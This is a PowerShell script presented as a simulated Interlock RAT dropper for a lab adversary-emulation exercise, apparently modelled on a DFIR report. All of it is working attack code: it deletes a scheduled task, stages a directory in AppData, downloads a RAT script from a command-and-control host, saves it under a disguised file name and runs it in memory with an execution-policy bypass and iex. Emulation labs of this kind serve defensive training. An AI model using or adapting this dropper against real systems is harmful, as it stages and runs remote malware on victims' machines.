# ============================================
# Simulated Interlock RAT Dropper — payload.ps1
# Source: lab manual §4.1 — /var/www/html/payload.ps1
# Target: Goku-mak (10.0.10.200) | C2: 10.0.20.50
#
# Behavior reproduced from The DFIR Report (KongTuke/Interlock, July 2025):
#   1. Delete the "Updater" scheduled task (cleanup pattern)
#   2. Stage the RAT in %APPDATA%\php\
#   3. Download rat.ps1 from Kali Apache (port 80) using a PowerShell User-Agent
#   4. Execute the RAT in-memory via Get-Content | iex
#
# Educational/lab use only.
# ============================================

# Step 1: Delete scheduled task (exact DFIR report behavior)
schtasks /delete /tn Updater /f 2>$null

# Step 2: Create RAT staging dir
# Resolves to: C:\Users\Gokuadm-mak\AppData\Roaming\php\
$ratDir = "$env:APPDATA\php"
New-Item -ItemType Directory -Force -Path $ratDir | Out-Null
Write-Host "[*] Created staging directory: $ratDir"

# Step 3: Download RAT from Kali (10.0.20.50 = Apache on port 80)
$w = New-Object System.Net.WebClient
$w.Headers.Add('User-Agent', 'PowerShell')
$ratCode = $w.DownloadString('http://10.0.20.50/rat.ps1')
Set-Content -Path "$ratDir\wefs.cfg" -Value $ratCode
Write-Host "[*] RAT saved to: $ratDir\wefs.cfg"

# Step 4: Execute RAT (mimics php.exe execution from report)
Write-Host "[*] Executing RAT..."
powershell.exe -ep Bypass -Command "& {Get-Content '$ratDir\wefs.cfg' -Raw | iex}"
